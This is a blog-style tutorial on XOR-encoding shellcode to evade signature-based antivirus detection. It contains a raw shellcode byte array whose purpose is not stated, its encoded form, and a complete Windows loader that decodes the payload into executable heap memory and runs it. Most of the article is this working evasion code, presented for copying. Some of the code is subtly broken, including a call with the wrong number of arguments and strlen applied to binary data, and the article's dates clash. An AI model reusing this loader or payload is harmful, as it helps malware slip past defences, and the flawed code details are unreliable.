---
title: "What is XOR Encoding?"
created: 2025-12-20
modified: 2024-12-20
tags: ["RE", "IDA", "XOR"]
draft: false
---

## Introduction

XOR Encoding is used to obfuscate strings and shellcodes to avoid signature-based detections. The payload is decoded at runtime using a XOR Key restoring the original bytes into the memory before execution. This article will go through XOR encoding and decoding concept and explain the way XOR encoding is used in the real world.  

## XOR Encoding & Decoding

XOR encoding is symmetric which means the same function can be used for both encoding and decoding by applying the same key. 

```cpp title="Encryption & Decryption"
void XOR(IN unsigned char* buffer, size_t bufferSize, IN unsigned char key[]) {
    for (int i = 0; i < bufferSize; ++i) {
        buffer[i] = buffer[i] ^ (*key + i);
        printf("\\x%02x", buffer[i]);
    }
}
```

Using the function above, the shellcode can be XOR encoded as shown below. A larger `bufferSize` value is recommended to prevent shellcode corruption.

```cpp title="Encoding Shellcode"
void XOR(IN unsigned char* buffer, size_t bufferSize, IN unsigned char key[]) {
    for (int i = 0; i < bufferSize; ++i) {
        buffer[i] = buffer[i] ^ (*key + i);
        printf("\\x%02x", buffer[i]);
    }
}

int main() {
    unsigned char shellcode[400] =
       "\xdb\xc0\xd9\x74\x24\xf4\xb8\x7e\x6d\x3e\xd2\x5d\x29\xc9"
       "\xb1\x31\x31\x45\x18\x83\xed\xfc\x03\x45\x6a\x8f\xcb\x2e"
       "\x7a\xcd\x34\xcf\x7a\xb2\xbd\x2a\x4b\xf2\xda\x3f\xfb\xc2"
       "\xa9\x12\xf7\xa9\xfc\x86\x8c\xdc\x28\xa8\x25\x6a\x0f\x87"
       "\xb6\xc7\x73\x86\x34\x1a\xa0\x68\x05\xd5\xb5\x69\x42\x08"
       "\x37\x3b\x1b\x46\xea\xac\x28\x12\x37\x46\x62\xb2\x3f\xbb"
       "\x32\xb5\x6e\x6a\x49\xec\xb0\x8c\x9e\x84\xf8\x96\xc3\xa1"
       "\xb3\x2d\x37\x5d\x42\xe4\x06\x9e\xe9\xc9\xa7\x6d\xf3\x0e"
       "\x0f\x8e\x86\x66\x6c\x33\x91\xbc\x0f\xef\x14\x27\xb7\x64"
       "\x8e\x83\x46\xa8\x49\x47\x44\x05\x1d\x0f\x48\x98\xf2\x3b"
       "\x74\x11\xf5\xeb\xfd\x61\xd2\x2f\xa6\x32\x7b\x69\x02\x94"
       "\x84\x69\xed\x49\x21\xe1\x03\x9d\x58\xa8\x49\x60\xee\xd6"
       "\x3f\x62\xf0\xd8\x6f\x0b\xc1\x53\xe0\x4c\xde\xb1\x45\xa2"
       "\x94\x98\xef\x2b\x71\x49\xb2\x31\x82\xa7\xf0\x4f\x01\x42"
       "\x88\xab\x19\x27\x8d\xf0\x9d\xdb\xff\x69\x48\xdc\xac\x8a"
       "\x59\xbf\x33\x19\x01\x6e\xd6\x99\xa0\x6e";

    executeShellcode(shellcode, 400, (unsigned char*)"AXR1");
    
    return 0;
}
```

```shell title="Output"
\x9a\x82\x9a\x30\x61\xb2\xff\x36\x24\x74\x99\x11\x64\x87\xfe\x61\x60\x17\x4b\xd7\xb8\xaa\x54\x1d\x33\xd5\x90\x72\x27\x93\x6b\xaf\x1b\xd0\xde\x4e\x2e\x94\xbd\x57\x92\xa8\xc2\x7e\x9a\xc7\x93\xf6\xfd\xae\x5b\xdc\x50\x1c\x78\xff\xcf\xbd\x08\xfa\x49\x64\xdf\xe8\x84\x57\x36\xed\xc7\x8e\xb0\xb3\x92\xcc\x61\x20\xa5\x9c\xb8\xd6\xf3\x20\xac\x2f\xa7\x23\xf9\xf2\xd0\x76\x2b\x10\x03\x1a\x67\x36\x62\x03\x10\x89\x92\xfb\xe5\x4c\xaf\x34\x42\x65\x0a\xc3\x5c\xbe\xbe\x3c\x35\xd2\xd9\x85\x26\x04\xb6\x55\xaf\x9b\x0a\xda\x31\x43\x87\x6a\x8a\x83\x81\xc3\xda\xc7\x81\x52\x39\xf7\xb9\xdf\x3a\x3b\x2c\xb3\x01\xfb\x73\xe4\xac\xb1\xdb\x4e\x5f\xb5\x30\x97\xfe\x01\xe2\x7f\xbb\x4c\xac\x86\x09\x3e\xd6\x88\x1b\x34\x82\xe5\x2e\xa3\x11\xbe\x2d\x45\xb0\x54\x63\x60\x16\xd1\x8a\xb5\x4f\xcf\x7d\xa7\xf1\x4d\x02\x46\x8d\xad\x1e\x2f\x84\xfa\x96\xd7\xf2\x67\x47\xcc\xbd\x98\x4a\xab\x26\x0f\x16\x76\xcf\x83\xbb\x72
```

Copy the output from the terminal and replace the `shellcode` array inside the main function. At runtime, the XOR encoded shellcode will be decoded in the memory.

## Real Life Example

The XOR encoding is used by threat actors to bypass signature-based detection by XOR Encoding the shellcode. Here is a real world example of XOR decoding a shellcode and executing it. 

```cpp title="main.cpp"
#include <iostream>
#include <Windows.h>

/*
    Description: The XOR() function is responsible for encoding and decoding shellcode.
*/
void XOR(IN unsigned char* buffer, size_t bufferSize, IN unsigned char key[]) {
    for (int i = 0; i < bufferSize; ++i) {
        buffer[i] = buffer[i] ^ (*key + i);
    }
}

/*
    Description: The executeShellcode() function is responsible for decoding and executing the shellcode.
*/
void executeShellcode(IN unsigned char* shellcode, IN unsigned char key[]) {
    // Decoding shellcode
    XOR((unsigned char*)shellcode, strlen((char*)shellcode), (unsigned char*)"AXR1");

    // Preparing to allocate space in the heap
    HANDLE hHeap = HeapCreate(
        HEAP_CREATE_ENABLE_EXECUTE,
        0,
        0
    );

    // Allocating spaces inside the heap
    void* bHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, strlen((char*)shellcode));

    // Copying the decoded shellcode to heap memory
    memcpy(bHeap, shellcode, strlen((char*)shellcode));

    // Executing the shellcode
    ((void(*)())bHeap)();
}

int main() {
    // XOR encoded shellcode
    unsigned char shellcode[] = "\x9a\x82\x9a\x30\x61\xb2\xff\x36\x24\x74\x99\x11\x64\x87\xfe\x61\x60\x17\x4b\xd7\xb8\xaa\x54\x1d\x33\xd5\x90\x72\x27\x93\x6b\xaf\x1b\xd0\xde\x4e\x2e\x94\xbd\x57\x92\xa8\xc2\x7e\x9a\xc7\x93\xf6\xfd\xae\x5b\xdc\x50\x1c\x78\xff\xcf\xbd\x08\xfa\x49\x64\xdf\xe8\x84\x57\x36\xed\xc7\x8e\xb0\xb3\x92\xcc\x61\x20\xa5\x9c\xb8\xd6\xf3\x20\xac\x2f\xa7\x23\xf9\xf2\xd0\x76\x2b\x10\x03\x1a\x67\x36\x62\x03\x10\x89\x92\xfb\xe5\x4c\xaf\x34\x42\x65\x0a\xc3\x5c\xbe\xbe\x3c\x35\xd2\xd9\x85\x26\x04\xb6\x55\xaf\x9b\x0a\xda\x31\x43\x87\x6a\x8a\x83\x81\xc3\xda\xc7\x81\x52\x39\xf7\xb9\xdf\x3a\x3b\x2c\xb3\x01\xfb\x73\xe4\xac\xb1\xdb\x4e\x5f\xb5\x30\x97\xfe\x01\xe2\x7f\xbb\x4c\xac\x86\x09\x3e\xd6\x88\x1b\x34\x82\xe5\x2e\xa3\x11\xbe\x2d\x45\xb0\x54\x63\x60\x16\xd1\x8a\xb5\x4f\xcf\x7d\xa7\xf1\x4d\x02\x46\x8d\xad\x1e\x2f\x84\xfa\x96\xd7\xf2\x67\x47\xcc\xbd\x98\x4a\xab\x26\x0f\x16\x76\xcf\x83\xbb\x72";

    // Executing shellcode
    executeShellcode(shellcode, (unsigned char*)"AXR1");

    return 0;
}
```

At runtime, the XOR encoded shellcode is decoded in memory and then the shellcode is copied over to the heap which is controlled by us and then the shellcode is executed.

## Disassembly Code

When the XOR encoding and decoding function is compiled in release mode the function is shown as below in x86 disassembly.

![[0002 What-is-XOR-Encoding-01.png]]

Only experienced reverse engineers would be able to see that a XOR encoding and decoding is occurring there as the x86 SIMD instructions such as `xmm0` to `xmm7` is used.

## Conclusion

XOR Encoding/Decoding is used by developers and threat actors to obfuscate strings and shellcodes to confuse the reverse engineer. The XOR decoding happens at runtime where it's decoded in a memory space. It can be used for both good and bad purposes such as developers uses it to protect their code and threat actors uses it to bypass signature-based detection and confuse reverse engineer.